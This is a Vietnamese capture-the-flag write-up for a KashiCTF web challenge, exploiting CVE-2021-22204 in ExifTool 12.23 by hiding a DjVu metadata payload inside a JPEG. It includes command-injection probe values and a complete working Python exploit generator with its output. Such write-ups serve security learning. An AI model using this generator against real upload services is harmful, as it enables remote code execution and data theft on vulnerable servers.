@@ -1,0 +1,126 @@
+CTF WRITEUP  ·  KashiCTF
+Evidence Lab
+Khai thác CVE-2021-22204 — ExifTool RCE via DjVu Metadata Injection
+Category: Web / Forensics   CVE: CVE-2021-22204   Độ khó: Medium
+Ngày: 2026-04-03   ExifTool version: 12.23 (vulnerable)
+
+1. Thông tin Challenge
+
+2. Mô tả
+Web app Evidence Lab cho phép người dùng upload ảnh và trả về kết quả extract metadata bằng ExifTool 12.23. Đây là version dính lỗ hổng critical CVE-2021-22204 cho phép thực thi mã từ xa (RCE) khi parse file DjVu chứa metadata độc hại.
+Hint của bài: "Examine EXIF data, GPS coordinates, camera settings, and custom metadata fields carefully" — đây là gợi ý rằng server đọc và xử lý metadata theo cách đặc biệt.
+3. Phân tích Lỗ hổng
+3.1 Root Cause
+ExifTool sử dụng hàm eval() của Perl để parse metadata trong chunk ANTz của file DjVu. Hàm này không sanitize input, cho phép inject Perl code tùy ý.
+Khi ExifTool xử lý chuỗi Copyright trong DjVu, nó parse chuỗi như Perl expression. Kẻ tấn công dùng ký tự \c để break out khỏi string context, sau đó inject code block ${...} chứa lệnh Perl/shell tùy ý.
+# Payload trong DjVu ANTz chunk:
+(metadata "\c${system('cat /flag*')};")
+ 
+# ExifTool 12.23 eval() chuỗi này như Perl:
+# \c  → control char, break out khỏi string
+# ${system('cat /flag*')}  → EXECUTE shell command
+
+3.2 Tại sao JPEG + HasselbladExif?
+Server chỉ accept file ảnh (JPG, PNG...). Để bypass, ta nhúng DjVu độc hại vào JPEG thật thông qua EXIF tag 0xc51b (HasselbladExif). ExifTool có logic đặc biệt: khi gặp tag này, nó interpret value như một DjVu document và parse recursively — dẫn đến kích hoạt exploit.
+4. Attack Flow
+
+5. Reconnaissance
+Upload ảnh thường với payload trong EXIF fields để kiểm tra server phản hồi gì:
+# Inject payload thăm dò vào các EXIF fields
+exiftool -Artist='$(id)' -Comment='{{7*7}}' -Copyright='`id`' test.jpg
+ 
+# Server response:
+ExifTool Version Number    : 12.23   ← VERSION CŨ!
+Artist                     : $(id)   ← không execute
+Comment                    : {{7*7}} ← không execute
+Copyright                  : `id`    ← không execute
+
+Quan sát thấy server dùng ExifTool 12.23 — version dính CVE-2021-22204. Metadata hiển thị nguyên xi (không phải RCE trực tiếp qua EXIF), nhưng ta có thể trigger RCE thông qua DjVu format.
+6. Exploit
+6.1 Dependencies
+djvulibre-bin  (cung cấp lệnh bzz và djvumake)
+exiftool  (để embed DjVu vào JPEG)
+python3
+
+6.2 payload_gen.py
+#!/usr/bin/env python3
+# CVE-2021-22204 — ExifTool RCE
+# Ref: exploit-db #50911 / UNICORD
+ 
+import base64, os, subprocess
+ 
+# 1. COMMAND
+command = "system('cat /flag* /flag.txt /app/flag* 2>/dev/null')"
+ 
+# 2. DjVu PAYLOAD
+payload = '(metadata "\\c${' + command + '};")'
+with open('payload', 'w') as f:
+    f.write(payload)
+ 
+# 3. BZZ COMPRESS + DJVUMAKE
+subprocess.run(['bzz', 'payload', 'payload.bzz'])
+subprocess.run(['djvumake', 'exploit.djvu',
+                'INFO=1,1', 'BGjp=/dev/null', 'ANTz=payload.bzz'])
+ 
+# 4. JPEG 1x1 pixel (smallest valid)
+image_b64 = (b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEB"
+             b"AgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/"
+             b"yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k=")
+with open('image.jpg', 'wb') as f:
+    f.write(base64.decodebytes(image_b64))
+ 
+# 5. EXIFTOOL CONFIG — tag 0xc51b = HasselbladExif
+config = '''
+%Image::ExifTool::UserDefined = (
+  'Image::ExifTool::Exif::Main' => {
+    0xc51b => {
+      Name => 'HasselbladExif',
+      Writable => 'string',
+      WriteGroup => 'IFD0',
+    },
+  },
+);
+1; #end
+'''
+with open('exiftool.config', 'w') as f:
+    f.write(config)
+ 
+# 6. EMBED DjVu INTO JPEG
+subprocess.run([
+    'exiftool', '-config', 'exiftool.config',
+    '-HasselbladExif<=exploit.djvu', 'image.jpg',
+    '-overwrite_original_in_place', '-q'
+])
+ 
+# CLEANUP
+for f in ['payload', 'payload.bzz', 'exploit.djvu', 'exiftool.config']:
+    os.remove(f)
+ 
+print('[+] Done! Upload image.jpg len Evidence Lab')
+
+6.3 Chạy và Upload
+$ sudo apt install djvulibre-bin exiftool -y
+$ python3 payload_gen.py
+[+] Done! Upload image.jpg len Evidence Lab
+ 
+# Upload image.jpg → Server response:
+kashiCTF{lZoYHFhLIKYCVShw41BHSKZsiwZwFkImpKqWcRWAg65gjE2Qm9aomIkizleNFWdG}
+kashiCTF{lZoYHFhLIKYCVShw41BHSKZsiwZwFkImpKqWcRWAg65gjE2Qm9aomIkizleNFWdG}
+kashiCTF{lZoYHFhLIKYCVShw41BHSKZsiwZwFkImpKqWcRWAg65gjE2Qm9aomIkizleNFWdG}
+ExifTool Version Number    : 12.23
+File Type                  : JPEG
+...
+
+
+7. Key Takeaways
+Luôn check version của tools server dùng — ExifTool version number trong response là dấu hiệu quan trọng.
+CVE-2021-22204 ảnh hưởng ExifTool 7.44 đến 12.23 — rất phổ biến trong các bài Web/Forensics CTF.
+Kỹ thuật polyglot file (JPEG chứa DjVu) bypass hoàn toàn file type validation phía server.
+Tag HasselbladExif (0xc51b) là key — không dùng tag này thì exploit không hoạt động.
+system() in output ra stdout, còn die() in ra stderr — cần biết server hiển thị cái nào.
+
+8. References
+exploit-db.com/exploits/50911 — PoC chính thức
+github.com/UNICORDev/exploit-CVE-2021-22204 — Tool tự động
+nvd.nist.gov/vuln/detail/CVE-2021-22204 — CVE detail
+exiftool.org — ExifTool changelog & patch notes
